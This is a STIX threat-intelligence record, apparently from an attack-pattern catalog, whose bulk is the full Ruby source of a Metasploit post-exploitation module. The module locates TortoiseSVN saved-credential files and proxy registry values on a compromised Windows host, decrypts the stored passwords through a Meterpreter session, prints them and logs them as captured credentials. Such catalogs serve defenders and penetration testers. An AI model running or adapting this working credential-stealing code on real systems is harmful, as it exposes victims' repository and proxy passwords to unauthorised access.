{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--da436399-9af0-42ee-a971-697eb9495714",
    "created": "2024-08-14T16:33:11.440923Z",
    "modified": "2024-08-14T16:33:11.440927Z",
    "name": "Windows Gather TortoiseSVN Saved Password Extraction",
    "description": " This module extracts and decrypts saved TortoiseSVN passwords.  In order for decryption to be successful this module must be executed under the same privileges as the user which originally encrypted the password.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/credentials/tortoisesvn.rb",
            "external_id": "tortoisesvn.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather TortoiseSVN Saved Password Extraction',\n        'Description' => %q{\n          This module extracts and decrypts saved TortoiseSVN passwords.  In\n          order for decryption to be successful this module must be executed\n          under the same privileges as the user which originally encrypted the\n          password.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Justin Cacak'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_write\n              stdapi_railgun_api\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n              stdapi_sys_process_attach\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_read\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def prepare_railgun\n    if !session.railgun.get_dll('crypt32')\n      session.railgun.add_dll('crypt32')\n    end\n  end\n\n  def decrypt_password(data)\n    pid = client.sys.process.getpid\n    process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)\n\n    mem = process.memory.allocate(128)\n    process.memory.write(mem, data)\n\n    if session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'\n      addr = [mem].pack('V')\n      len = [data.length].pack('V')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 8)\n      len, addr = ret['pDataOut'].unpack('V2')\n    else\n      addr = [mem].pack('Q')\n      len = [data.length].pack('Q')\n      ret = session.railgun.crypt32.CryptUnprotectData(\"#{len}#{addr}\", 16, nil, nil, nil, 0, 16)\n      len, addr = ret['pDataOut'].unpack('Q2')\n    end\n\n    return '' if len == 0\n\n    decrypted_pw = process.memory.read(addr, len)\n    return decrypted_pw\n  end\n\n  def get_proxy_data\n    # Check if user proxy setting are utilized\n    @key_base = 'HKCU\\\\Software\\\\TortoiseSVN\\\\Servers\\\\global\\\\'\n    http_proxy_password = registry_getvaldata(@key_base.to_s, 'http-proxy-password')\n\n    if http_proxy_password.nil?\n      return\n    else\n      # A proxy with password is utilized, gather details\n      print_good('HTTP Proxy Settings')\n      http_proxy_username = registry_getvaldata(@key_base.to_s, 'http-proxy-username')\n      http_proxy_host = registry_getvaldata(@key_base.to_s, 'http-proxy-host')\n      http_proxy_port = registry_getvaldata(@key_base.to_s, 'http-proxy-port')\n\n      # Output results to screen\n      print_status(\"     Host: #{http_proxy_host}\")\n      print_status(\"     Port: #{http_proxy_port}\")\n      print_status(\"     Username: #{http_proxy_username}\")\n      print_status(\"     Password: #{http_proxy_password}\")\n      print_status('')\n    end\n\n    # Report proxy creds\n    if session.db_record\n      source_id = session.db_record.id\n    else\n      source_id = nil\n    end\n\n    report_cred(\n      ip: ::Rex::Socket.resolv(http_proxy_host), # TODO: Fix up report_host?\n      port: http_proxy_port,\n      service_name: 'http',\n      user: http_proxy_username,\n      password: http_proxy_password\n    )\n  end\n\n  def get_config_files\n    # Determine if TortoiseSVN is installed and parse config files\n    savedpwds = 0\n    path = session.sys.config.getenv('APPDATA') + '\\\\Subversion\\\\auth\\\\svn.simple\\\\'\n    print_status(\"Checking for configuration files in: #{path}\")\n\n    begin\n      session.fs.dir.foreach(path) do |file_name|\n        next if (file_name == '.') || (file_name == '..')\n\n        savedpwds = analyze_file(path + file_name)\n      end\n    rescue StandardError => e\n      print_error \"Exception raised: #{e.message}\"\n      print_status('No configuration files located: TortoiseSVN may not be installed or configured.')\n      return\n    end\n\n    if savedpwds == 0\n      print_status('No configuration files located')\n    end\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: fullname,\n      post_reference_name: refname,\n      session_id: session_db_id,\n      origin_type: :session,\n      private_data: opts[:password],\n      private_type: :password,\n      username: opts[:user]\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def analyze_file(filename)\n    config = client.fs.file.new(filename, 'r')\n    contents = config.read\n    config_lines = contents.split(\"\\n\")\n\n    print_good('Account Found:')\n    line_num = 0\n\n    for line in config_lines\n      line.chomp\n      line_num += 1\n      if line_num == 8\n        enc_password = Rex::Text.decode_base64(line)\n        password = decrypt_password(enc_password)\n      elsif line_num == 12\n        if line.match(/<(.*)>.(.*)/)\n          # Parse for output\n          url = ::Regexp.last_match(1)\n          realm = ::Regexp.last_match(2)\n          realm.gsub! \"\\r\", '' # Remove \\r (not common)\n          if line.match(%r{<(.*)://(.*):(.*)>})\n            # Parse for reporting\n            sname = ::Regexp.last_match(1)\n            host = ::Regexp.last_match(2)\n            portnum = ::Regexp.last_match(3)\n            portnum.gsub! \"\\r\", '' # Remove \\r (not common)\n          end\n        else\n          url = '<Unknown/Error>'\n        end\n      elsif line_num == 16\n        user_name = line\n        user_name.gsub! \"\\r\", '' # Remove \\r (not common)\n      end\n    end\n    config.close\n\n    # Handle null values or errors\n    if user_name.nil?\n      user_name = '<Unknown/Error>'\n    end\n\n    # Output results to screen\n    print_status(\"     URL: #{url}\")\n    print_status(\"     Realm: #{realm}\")\n    print_status(\"     User Name: #{user_name}\")\n    print_status(\"     Password: #{password}\")\n    print_status('')\n\n    # Report\n    if session.db_record\n      source_id = session.db_record.id\n    else\n      source_id = nil\n    end\n\n    report_cred(\n      ip: ::Rex::Socket.resolv_to_dotted(host), # XXX: Workaround for unresolved hostnames\n      port: portnum,\n      service_name: sname,\n      user: user_name,\n      password: password\n    )\n\n    vprint_status('Should have reported...')\n\n    # Set savedpwds to 1 on return\n    return 1\n  end\n\n  def run\n    # Get uid.  Decryption will only work if executed under the same user account as the password was encrypted.\n    uid = session.sys.config.getuid\n\n    if is_system?\n      print_error(\"This module is running under #{uid}.\")\n      print_error('Automatic decryption will not be possible.')\n      print_error('Manually migrate to a user process to achieve successful decryption (e.g. explorer.exe).')\n    else\n      print_status('Searching for TortoiseSVN...')\n      prepare_railgun\n      get_config_files\n      get_proxy_data\n    end\n\n    print_status('Complete')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}